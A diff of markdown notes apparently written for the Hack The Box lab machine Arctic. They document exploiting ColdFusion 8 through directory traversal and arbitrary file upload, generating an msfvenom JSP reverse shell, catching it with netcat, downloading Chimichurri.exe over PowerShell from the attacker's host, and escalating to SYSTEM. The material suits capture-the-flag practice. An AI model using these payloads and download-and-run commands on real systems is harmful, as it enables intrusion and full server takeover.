@@ -1,5 +1,6 @@
 # HTB Arctic 10.10.10.11
 
+
 - OS Name:                   Microsoft Windows Server 2008 R2 Standard 
 - OS Version:                6.1.7600 N/A Build 7600
 - No Hotfix
@@ -8,9 +9,10 @@
 - Coldfusion 8 CVE-2010-2861 - Directory traversal
 - Coldfusion 8 CVE-2009-2265 Arbitrary File Upload / Execution
 
-- MS10-092 Schelevator
-- MS10-059 
+- MS10-092 Schelevator (meterpreter)
+- MS10-059 Chimichurri (*.exe)
 
+- powershell transfert
 
 
 
@@ -19,11 +21,38 @@
 https://medium.com/@chennylmf/hackthebox-walkthrough-arctic-e0ae709fc121
 
 
-## nmap
+## nmap => 8500
+
+```
+# nmap -sC -sV -A 10.10.10.11
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 21:41 CEST
+Nmap scan report for 10.10.10.11
+Host is up (0.049s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   48.78 ms 10.10.14.1
+2   54.29 ms 10.10.10.11
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 141.01 seconds
+root@kali:~# 
+```
+
 => 8500
 
 
-## port 8500
+## port 8500 : Coldfusion
 
 http://10.10.10.11:8500/CFIDE
 http://10.10.10.11:8500/CFIDE/administrator
@@ -48,6 +77,7 @@ Possible Hashs:
 ````
 
 => decrypt : happyday
+
 
 ## Use Coldfusion to upload file
 
@@ -130,7 +160,9 @@ POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/
  
 This will create a file called ‘cfdownload.cfm’ located in the ‘/userfiles/files/’ directory on the server that when executed will access the file hosted at ‘https://1.1.1.1/pwned.exe’ and then save it to the ‘C:\’ drive on the victim server as ‘pwned.exe.
 
-## Upload script
+
+
+## Upload script : CVE-2009-2265.py
 
 ````
 #!/usr/bin/python
@@ -184,13 +216,36 @@ except requests.Timeout:
 
 ## Reverse shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=9000 -f raw > reverseshell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f raw > shell.jsp
 
+Upload it
+```
+./CVE-2009-2265.py 10.10.10.11 8500 reverseshell.jsp
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
 
+```
 
+Run it
+```
+$ curl http://10.10.10.11:8500/userfiles/file/exploit.jsp
+```
 
+Netcat
+```
+# nc -lvp 9000
+listening on [any] 9000 ...
+10.10.10.11: inverse host lookup failed: Unknown host
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.11] 49262
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
-http://10.10.10.11:8500/userfiles/file/exploit.jsp
+C:\ColdFusion8\runtime\bin>whoami
+whoami
+arctic\tolis
+c:\> type \Users\tolis\Desktop\user.txt
+XXXXXXXXXXXXXXX
+```
 
 ## post/multi/recon/local_exploit_suggester
 
@@ -258,11 +313,14 @@ meterpreter : exploit/windows/local/ms10_092_schelevator
 https://www.exploit-db.com/exploits/14610/ : src
 
 https://github.com/Re4son/Chimichurri : .exe
+```
+wget https://github.com/Re4son/Chimichurri/raw/master/Chimichurri.exe
+```
 
 Download chimichurri.exe
 ````
 C:\>echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-C:\>echo $url = "http://10.10.14.10/chimichurri.exe" >>wget.ps1
+C:\>echo $url = "http://10.10.14.30:8000/Chimichurri.exe" >>wget.ps1
 C:\>echo $file = "exploit.exe" >>wget.ps1
 C:\>echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
@@ -272,7 +330,7 @@ C:\>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -F
 start a netcat listener, and run the exploit.
 
 ````
-C:\ColdFusion8>exploit.exe 10.10.14.10 443
+C:\ColdFusion8>exploit.exe 10.10.14.30 443
 
 /Chimichurri/-->This exploit gives you a Local System shell 
 /Chimichurri/-->Changing registry values...
@@ -292,6 +350,9 @@ C:\ColdFusion8>whoami & hostname
 whoami & hostname
 nt authority\system
 arctic
+
+C:\Users\Administrator\Desktop>type root.txt
+
 ````
 
 
